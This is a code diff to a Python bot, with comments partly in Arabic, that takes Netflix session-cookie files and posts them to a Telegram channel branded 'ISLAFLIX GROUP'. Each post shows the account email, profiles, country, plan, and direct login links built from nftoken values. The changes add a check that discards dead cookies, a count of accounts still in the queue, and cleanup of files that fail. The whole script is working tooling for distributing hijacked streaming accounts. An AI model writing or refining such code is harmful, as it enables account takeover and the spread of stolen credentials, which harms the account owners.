@@ -11,6 +11,26 @@ COOKIES_DIR = "./cookies"
 INTERVAL_SECONDS = 2 * 60  # 2 minutes interval between each send
 # =================================================
 
+def is_cookie_valid(file_path):
+    """فحص ملف الكوكيز والتأكد من أنه يحتوي على بيانات سارية وصالحة للاستخدام"""
+    try:
+        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
+            return False
+            
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+
+        # التأكد من وجود معرّف نتفليكس أو توكن صالح داخل الملف
+        has_netflix_id = bool(re.search(r'NetflixId', content, re.IGNORECASE))
+        has_token = bool(re.search(r'nftoken|token', content, re.IGNORECASE))
+        
+        if not (has_netflix_id or has_token):
+            return False
+
+        return True
+    except Exception:
+        return False
+
 def parse_cookies_file(file_path):
     with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
         content = f.read()
@@ -73,26 +93,7 @@ def parse_cookies_file(file_path):
     ios_link = f"https://netflix.com/?nftoken={token_clean}"
     tv_link = f"https://netflix.com/tv2?nftoken={token_clean}"
 
-    # Template with "Available Accounts" and "React for more"
-    msg = f"""✂️ ════════════════════════════════════ ✂️
-🎬 **NETFLIX VIP ACCOUNT** 🌟
-🔥 **حسابات متوفرة | Available Accounts**
-
-✅ **Status:** Ready For Instant Use
-📧 **Email:** `{email_full}`
-👥 **Profiles:** {profiles}
-🌍 **Country:** {country_display}
-💎 **Plan:** {plan_type}
-
-🔗 **Direct Login Links:**
-[💻 PC]({pc_link}) | [🤖 Android]({android_link})
-[🍏 iOS]({ios_link}) | [📺 TV]({tv_link})
-
-💬 **تفاعل للمزيد | React for more**
-⚡ *ISLAFLIX GROUP*
-✂️ ════════════════════════════════════ ✂️"""
-
-    return msg
+    return email_full, profiles, country_display, plan_type, pc_link, android_link, ios_link, tv_link
 
 def send_to_telegram(text):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -107,7 +108,6 @@ def send_to_telegram(text):
         if response.status_code == 200:
             data = response.json()
             message_id = data.get("result", {}).get("message_id")
-            print("[+] Account sent successfully!")
             if message_id:
                 add_reaction(message_id)
             return True
@@ -131,7 +131,7 @@ def add_reaction(message_id):
         pass
 
 def main():
-    print("[*] Automated Cookie Distributor started.")
+    print("[*] Automated Cookie Distributor with Validator started.")
     if not os.path.exists(COOKIES_DIR):
         os.makedirs(COOKIES_DIR)
 
@@ -146,11 +146,39 @@ def main():
 
         file_name = txt_files[0]
         file_path = os.path.join(COOKIES_DIR, file_name)
-        print(f"\n[*] Processing file: {file_name}")
+        
+        # الخطوة الذكية: فحص الكوكيز قبل الإرسال
+        if not is_cookie_valid(file_path):
+            print(f"[-] Invalid or dead cookie detected: {file_name}. Deleting it...")
+            os.remove(file_path)
+            continue
+
+        # حساب عدد الحسابات السارية المتبقية
+        total_accounts = len(txt_files)
+        print(f"\n[*] Processing valid file: {file_name} ({total_accounts} accounts in queue)")
 
         try:
-            formatted_message = parse_cookies_file(file_path)
-            success = send_to_telegram(formatted_message)
+            email_full, profiles, country_display, plan_type, pc_link, android_link, ios_link, tv_link = parse_cookies_file(file_path)
+
+            msg = f"""✂️ ════════════════════════════════════ ✂️
+🎬 **NETFLIX VIP ACCOUNT** 🌟
+🔥 **حسابات متوفرة | Available Accounts:** `{total_accounts}` متبقية
+
+✅ **Status:** Ready For Instant Use
+📧 **Email:** `{email_full}`
+👥 **Profiles:** {profiles}
+🌍 **Country:** {country_display}
+💎 **Plan:** {plan_type}
+
+🔗 **Direct Login Links:**
+[💻 PC]({pc_link}) | [🤖 Android]({android_link})
+[🍏 iOS]({ios_link}) | [📺 TV]({tv_link})
+
+💬 **تفاعل للمزيد | React for more**
+⚡ *ISLAFLIX GROUP*
+✂️ ════════════════════════════════════ ✂️"""
+
+            success = send_to_telegram(msg)
             
             if success:
                 os.remove(file_path)
@@ -159,8 +187,13 @@ def main():
                 print("[-] Failed to send message, will retry this file in the next cycle.")
         except Exception as e:
             print(f"[-] Error processing file {file_name}: {e}")
+            # لو صار خطأ غريب بالملف، نحذفه عشان ما يعلق البوت
+            try:
+                os.remove(file_path)
+            except:
+                pass
 
-        print(f"[*] Waiting 2 minutes before sending the next cookie...")
+        print(f"[*] Waiting 2 minutes before processing the next cookie...")
         time.sleep(INTERVAL_SECONDS)
 
 if __name__ == "__main__":
